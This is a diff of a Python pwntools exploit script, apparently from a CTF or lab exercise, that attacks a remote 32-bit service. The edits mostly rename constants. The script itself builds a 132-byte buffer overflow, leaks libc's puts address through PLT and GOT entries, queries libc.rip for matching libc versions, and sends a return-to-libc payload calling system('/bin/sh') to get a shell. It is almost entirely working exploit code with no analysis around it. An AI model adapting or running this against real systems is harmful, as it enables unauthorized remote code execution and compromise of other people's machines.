@@ -2,38 +2,28 @@ import json
 import requests
 from pwn import remote, u32, p32, flat, log
 
-# Connection Information
-conn = '192.168.0.156'
-port = 9000
-
-# Output Lines Configuration
-OUTPUT_LINES_BEFORE, OUTPUT_LINES_AFTER = 6, 2
-
 # Static Configuration
-static = "./itc_app"
-buffSize = 132
-
-# URLs and Headers for API Requests
+CONN, PORT = '192.168.0.156', 9000
+OUTPUT_LINES_BEFORE, OUTPUT_LINES_AFTER = 6, 2
+BUFF_SIZE = 132
 FIND_LIBC_URL = 'https://libc.rip/api/find'
 LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
 HEADERS = {'Content-Type': 'application/json'}
-
-# Function Offsets
 PLT_PUTS, MAIN_ADDR, GOT_PUTS = 0x8048340, 0x804847b, 0x80497ac
 
 
-def leak_via_puts(conn, port,put_out_addr, msg="puts"):
+def leak_via_puts(conn, port,puts_got_addr, msg="puts"):
     """
     Leaks randomised libc address via puts' PLT and function's GOT.
     """
-    global proc
-
+    global proc 
     proc = remote(conn,port)
+
     payload = flat(
-        b'A' * buffSize,
+        b'A' * BUFF_SIZE,
         p32(PLT_PUTS),
         p32(MAIN_ADDR),
-        p32(put_out_addr),
+        p32(puts_got_addr),
     )
     
     proc.sendline(payload)
@@ -50,7 +40,7 @@ def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
     """
 
     # Leak puts address to get libc base address
-    puts_addr = leak_via_puts(conn, port, GOT_PUTS)
+    puts_addr = leak_via_puts(CONN, PORT, GOT_PUTS)
     log.success(f'Leaked libc puts address: {hex(puts_addr)}')
 
     # Get lib base addr using puts_offset
@@ -64,7 +54,7 @@ def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
     
     # Create and send system('/bin/sh') buffer overflow payload
     payload = flat(
-        b'A' * buffSize,
+        b'A' * BUFF_SIZE,
         p32(system_addr), 
         p32(exit_addr), 
         p32(binsh_addr),
@@ -139,7 +129,7 @@ def handle_reverse_shell():
 
 def main():
     # Initial leak of the puts address to identify potential libc versions
-    puts_addr = leak_via_puts(conn, port, GOT_PUTS)
+    puts_addr = leak_via_puts(CONN, PORT, GOT_PUTS)
     potential_libcs = find_potential_libcs(puts_addr)
 
     # Loop through each potential libc version to attempt exploitation
